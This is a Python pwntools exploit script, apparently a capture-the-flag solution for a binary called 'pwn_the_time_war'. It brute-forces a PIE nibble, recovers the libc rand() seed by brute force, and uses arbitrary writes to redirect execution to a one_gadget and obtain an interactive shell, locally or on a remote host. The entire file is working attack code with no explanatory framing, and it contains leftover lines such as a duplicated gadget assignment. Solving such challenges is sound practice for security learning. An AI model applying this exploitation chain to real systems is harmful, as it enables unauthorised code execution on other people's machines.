#!/bin/python3

from pwn import *
from tqdm import tqdm
from ctypes import CDLL
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./pwn_the_time_war_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!
libcx = CDLL("libc.so.6")
alloc_counter = 0

gdbscript = '''
break *run+315
# break *srand
break *main+30
'''
def init():
    if (args.PGDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
        if (args.GDB):
            gdbx = gdb.attach(pp, gdbscript=gdbscript)
    return pp

pp = init()

def unpack_ptr(ptr):
    if (len(ptr) > 8):
        return u64(ptr[0:8])
    return u64(ptr + (b"\x00" * (8 - len(ptr)))  )

def find_seed(target_codes):
    libcx = CDLL('libc.so.6')
    fixed_suffix = 0x420
    possible_seeds = []
    for high_bits in range(0x100000):
        candidate_seed = (high_bits << 12) | fixed_suffix
        libcx.srand(candidate_seed)
        
        match = True
        for code in target_codes:
            if (libcx.rand() % 16) != code:
                match = False
                break
        if match:
            # log.info(f"FOUND MATCH!")
            possible_seeds.append(candidate_seed)
    return possible_seeds

def write(pos, cont):
    pp.recvuntil(b"? ")
    pp.sendline(str(pos).encode())
    pp.recvuntil(b"? ")
    pp.sendline(str(cont).encode())

def exploit():
    global pp
    randn = [int(x) for x in pp.recvline()[50:].rstrip().split(b"-")]
    log.info(f"bruteforcing pie nibble [candidate 0xbXXX] {hex(elf.sym['main'])}")
    cand = None
    val = 0
    if (args.GDB or args.PGDB):
        cand = int(input("what is the nibble >> "), 16)  << 12
    else:
        cand = 0xb000
    for i in range(256):
        val = (elf.sym["main"] & 0xfff) + 19 + cand
        log.info(f"nibble guess {hex(val)}")
        write(10, val)
        write(10, val)
        pp.recvline()
        try: 
            line = pp.recvline()
            print(line)
            randn += [int(x) for x in line[50:].rstrip().split(b"-")]
            break
        except: 
            log.info("Invalid, trying again")
            pp.close()
            pp = init()
            randn = [int(x) for x in pp.recvline()[50:].rstrip().split(b"-")]
            
    log.success("Nibble guessed !!")
    print(randn)
    
    seeds = find_seed(randn)
    aslr_nibble = None
    print(seeds)
    if (len(seeds) > 0):
        log.success(f"seed guessed {hex(seeds[0])}")
        aslr_nibble = seeds[0]
    else :
        log.error("seed cannot be guessed")
    log.info("fixxing env for the gadget")
    # rbx = 0x9a
    for i in range(4):
        write(0x9a + i, 0)
        write(10, val)


    alleged_pie = seeds[0] - 848928
    one_gadget = alleged_pie + (libc.sym["__libc_start_main"] & 0xffffffff)
    one_gadget = alleged_pie + 0x4c139
    log.info(f"we gonna take {hex(seeds[0])}[0] {hex(alleged_pie)} as a seed gadget {hex(one_gadget)}")
    write(19, one_gadget >> 16)
    write(18, one_gadget & 0xffff)
    base : 0x7ffce2b48f14



    pp.interactive()
    

libc = ELF("./libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
exploit()
